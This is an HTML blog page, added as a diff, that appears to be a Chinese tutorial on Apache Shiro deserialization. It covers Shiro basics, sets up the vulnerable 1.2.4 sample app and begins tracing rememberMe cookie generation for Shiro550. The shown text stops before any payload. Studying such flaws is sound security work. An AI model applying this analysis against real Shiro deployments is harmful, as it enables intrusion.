@@ -1,0 +1,1106 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xzq1_64x64.png">
+  <link rel="icon" href="/img/xzq1_64x64.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lingx5">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="shiro 反序列化简介Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，可执行身份验证、授权、加密和会话管理。借助 Shiro 易于理解的 API，您可以快速轻松地保护任何应用程序 —— 从最小的移动应用程序到最大的 Web 和企业应用程序。 从官方的简介中就可以看出他是款用来完成权限认证的一个框架 入门想要深入了解一下可以去看官方的文章：Application Se">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro 反序列化">
+<meta property="og:url" content="http://lingx5.github.io/2025/04/21/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="lingx5的博客">
+<meta property="og:description" content="shiro 反序列化简介Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，可执行身份验证、授权、加密和会话管理。借助 Shiro 易于理解的 API，您可以快速轻松地保护任何应用程序 —— 从最小的移动应用程序到最大的 Web 和企业应用程序。 从官方的简介中就可以看出他是款用来完成权限认证的一个框架 入门想要深入了解一下可以去看官方的文章：Application Se">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418154009283.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250416161643740.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250416161444436.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418142722287.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418143004645.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418143034911.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418143736071.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418144134210.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418144217725.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418144432971.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418144523837.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418151532825.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418162158232.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418154829591.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418154957897.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418162648596.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418163413548.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418164320179.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418164529148.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418164707431.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418164758838.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418164839829.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418164912359.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418165053370.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418183935346.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418184217097.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418184329300.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418184454169.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418184648233.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418185421217.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250420093552991.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250420133400523.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250420134054839.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250421105715521.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250419165458208.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250420153552612.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250420155140387.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250420191944371.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250420192446736.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250420192545420.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250421135933032.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250421151245612.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250421151413989.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250421152015972.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250421164652463.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250420201255464.png">
+<meta property="article:published_time" content="2025-04-21T12:50:26.000Z">
+<meta property="article:modified_time" content="2025-04-21T12:51:42.916Z">
+<meta property="article:author" content="lingx5">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="Shiro">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250418154009283.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Shiro 反序列化 - lingx5的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"lingx5.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"#"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"Q4th1PtYC02FHNKGV3QVJgNX-MdYXbMMI","app_key":"Y9vGCfdqm9u55ZBjM8ep8KDX","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-3-23","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lingx5的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Shiro 反序列化"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-21 20:50" pubdate>
+          2025年4月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          70 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="Shiro"
+        id="heading-2f5ec23a7af082f8c11dbfce849c74fb" role="tab" data-toggle="collapse" href="#collapse-2f5ec23a7af082f8c11dbfce849c74fb"
+        aria-expanded="true"
+      >
+        Shiro
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-2f5ec23a7af082f8c11dbfce849c74fb"
+           role="tabpanel" aria-labelledby="heading-2f5ec23a7af082f8c11dbfce849c74fb">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2025/04/21/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Shiro 反序列化"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">Shiro 反序列化</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Shiro 反序列化</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <meta name="referrer" content="no-referrer" />
+
+<h1 id="shiro-反序列化"><a href="#shiro-反序列化" class="headerlink" title="shiro 反序列化"></a>shiro 反序列化</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，可执行身份验证、授权、加密和会话管理。借助 Shiro 易于理解的 API，您可以快速轻松地保护任何应用程序 —— 从最小的移动应用程序到最大的 Web 和企业应用程序。</p>
+<p>从官方的简介中就可以看出他是款用来完成权限认证的一个框架</p>
+<h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><p>想要深入了解一下可以去看官方的文章：<a target="_blank" rel="noopener" href="https://www.infoq.com/articles/apache-shiro/">Application Security With Apache Shiro - InfoQ</a></p>
+<p>当然也可去从 B 站上找一下对应的教程，时间也不用太长就三四个小时就可以，快速了解一下</p>
+<p>shiro 当在有几个比较重要的概念</p>
+<ul>
+<li><code>Subject</code>： 表示当前执行操作的“用户”</li>
+<li><code>SecurityManager</code>： 负责管理所有的安全操作，像是认证、授权、会话管理等。</li>
+<li><code>Realm</code> 从数据源中获取用户身份信息（认证数据）和用户权限信息（授权数据）。</li>
+<li><code>Principal</code> Realm 认证成功后由它返回的数据，来标识认证通过的客户端（用户）</li>
+</ul>
+<p>基本的认证流程</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250418154009283.png" srcset="/img/loading.gif" lazyload alt="image-20250418154009283" style="zoom:67%;" />
+
+<ol>
+<li><strong>Subject 发起认证请求</strong>（调用 <code>subject.login(token)</code>，token 包含用户凭据，如用户名和密码）。</li>
+<li><strong>SecurityManager 接收到登录请求</strong>，负责协调认证工作，调用底层的 <code>Authenticator</code>。</li>
+<li><strong>Authenticator 调用对应的 Realm</strong>（或多个 Realm）去验证凭证。</li>
+<li><strong>Realm 认证成功返回认证信息</strong> —— 其中包括：<ul>
+<li><strong>Principal</strong>（标识用户身份的信息，比如用户名、用户 ID 等）</li>
+<li>以及凭据相关信息（Credentials）</li>
+</ul>
+</li>
+<li><strong>Authenticator 收集这些信息，封装成 AuthenticationInfo 对象返回给 SecurityManager</strong>。</li>
+<li><strong>SecurityManager 判断认证是否成功</strong>，如果通过，会将对应的 Principal 等信息关联到当前 Subject 中。</li>
+<li>登录流程返回成功，Subject 成为一个已认证状态。</li>
+</ol>
+<p>我们来看一下最基本的代码示例使用，这里借用最简单的 IniRealm 来进行认证</p>
+<p>导入依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 添加日志依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.30<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-simple<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.30<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>在 Resource 目录下创建 <code>shiro.ini</code> 文件，用来让 IniRealm 获取用户的相关数据</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[users]</span><br><span class="hljs-comment"># 用户名=密码,角色1,角色2,...</span><br><span class="hljs-attr">admin</span>=<span class="hljs-number">123456</span>,admin<br><span class="hljs-attr">guest</span>=guest,guest<br><br><span class="hljs-section">[roles]</span><br><span class="hljs-attr">admin</span>=*<br><span class="hljs-attr">guest</span>=read<br></code></pre></td></tr></table></figure>
+
+<p>login 测试代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> org.apache.shiro.SecurityUtils;<br><span class="hljs-keyword">import</span> org.apache.shiro.authc.AuthenticationException;<br><span class="hljs-keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;<br><span class="hljs-keyword">import</span> org.apache.shiro.config.IniSecurityManagerFactory;<br><span class="hljs-keyword">import</span> org.apache.shiro.mgt.SecurityManager;<br><span class="hljs-keyword">import</span> org.apache.shiro.subject.Subject;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.Factory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Login</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 1. 通过ini配置文件创建SecurityManager工厂</span><br>        Factory&lt;SecurityManager&gt; factory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IniSecurityManagerFactory</span>(<span class="hljs-string">&quot;classpath:shiro.ini&quot;</span>);<br>        <span class="hljs-comment">// 2. 获取SecurityManager实例并设置到SecurityUtils</span><br>        <span class="hljs-type">SecurityManager</span> <span class="hljs-variable">securityManager</span> <span class="hljs-operator">=</span> factory.getInstance();<br>        SecurityUtils.setSecurityManager(securityManager);<br>        <span class="hljs-comment">// 3. 获取当前用户(Subject)</span><br>        <span class="hljs-type">Subject</span> <span class="hljs-variable">currentUser</span> <span class="hljs-operator">=</span> SecurityUtils.getSubject();<br>        <span class="hljs-comment">// 4. 登录认证</span><br>        <span class="hljs-type">UsernamePasswordToken</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UsernamePasswordToken</span>(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>);<br>        <span class="hljs-keyword">try</span>&#123;<br>            currentUser.login(token);<br>            System.out.println(<span class="hljs-string">&quot;登录成功&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (AuthenticationException e)&#123;<br>            System.out.println(<span class="hljs-string">&quot;登录失败&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 5. 角色和权限校验</span><br>        <span class="hljs-keyword">if</span>(currentUser.hasRole(<span class="hljs-string">&quot;admin&quot;</span>)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;用户拥有admin角色&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(currentUser.isPermitted(<span class="hljs-string">&quot;*&quot;</span>)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;用户拥有所有权限&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 6. 登出</span><br>        currentUser.logout();<br>        System.out.println(<span class="hljs-string">&quot;用户已登出&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>目录结构</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250416161643740.png" srcset="/img/loading.gif" lazyload alt="image-20250416161643740" style="zoom:50%;" />
+
+<p>输出结果</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250416161444436.png" srcset="/img/loading.gif" lazyload alt="image-20250416161444436"></p>
+<p>现在让我们来学习一下 shiro 的漏洞</p>
+<h2 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p>
+<p>部署 samples-web</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418142722287.png" srcset="/img/loading.gif" lazyload alt="image-20250418142722287"></p>
+<p>修改 <code>samples-web</code> 的 pom.xml 文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>当然默认是 jdk6，你也可以在父工程的 <code>pom</code> 文件中切换 jdk 的编译版本</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418143004645.png" srcset="/img/loading.gif" lazyload alt="image-20250418143004645"></p>
+<p>启动项目</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250418143034911.png" srcset="/img/loading.gif" lazyload alt="image-20250418143034911" style="zoom: 50%;" />
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="shiro-交互流程"><a href="#shiro-交互流程" class="headerlink" title="shiro 交互流程"></a>shiro 交互流程</h4><p>勾选 Remember Me 登录一下</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250418143736071.png" srcset="/img/loading.gif" lazyload alt="image-20250418143736071" style="zoom:50%;" />
+
+<p>首先就是发送正常的表单数据</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418144134210.png" srcset="/img/loading.gif" lazyload alt="image-20250418144134210"></p>
+<p>服务器响应 Set-Cookie: rememberMe &#x3D;….</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250418144217725.png" srcset="/img/loading.gif" lazyload alt="image-20250418144217725" style="zoom: 50%;" />
+
+<p>接着客户端会发送一个带有 remeberMe 字段的请求</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250418144432971.png" srcset="/img/loading.gif" lazyload alt="image-20250418144432971" style="zoom: 33%;" />
+
+<p>然后就会等了成功</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418144523837.png" srcset="/img/loading.gif" lazyload alt="image-20250418144523837"></p>
+<h4 id="RememberMe-的生成"><a href="#RememberMe-的生成" class="headerlink" title="RememberMe 的生成"></a>RememberMe 的生成</h4><p>看到勾选了 RememberMe 的选项后，服务器端会返回来一个 <code>Set-Cookie: rememberMe=</code> 的字段，客户端再次发送请求会带上这个值</p>
+<p>我们来源码看一下这个值是如何生成的</p>
+<p>在 idea 里搜索 <code>RememberMe</code> 会看到 org.apache.shiro.web.mgt.CookieRememberMeManager 这个类，看类名他应该就是管理 Cookie 中的 RememberMe 的</p>
+<p>在 org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity 方法打断点，这个方法名叫 <code>remember序列化表示</code> 应该就是生成 RememberMe 字段的方法</p>
+<p>我们发送请求，发现确实会断在这里</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418151532825.png" srcset="/img/loading.gif" lazyload alt="image-20250418151532825"></p>
+<p>看一下调用栈</p>
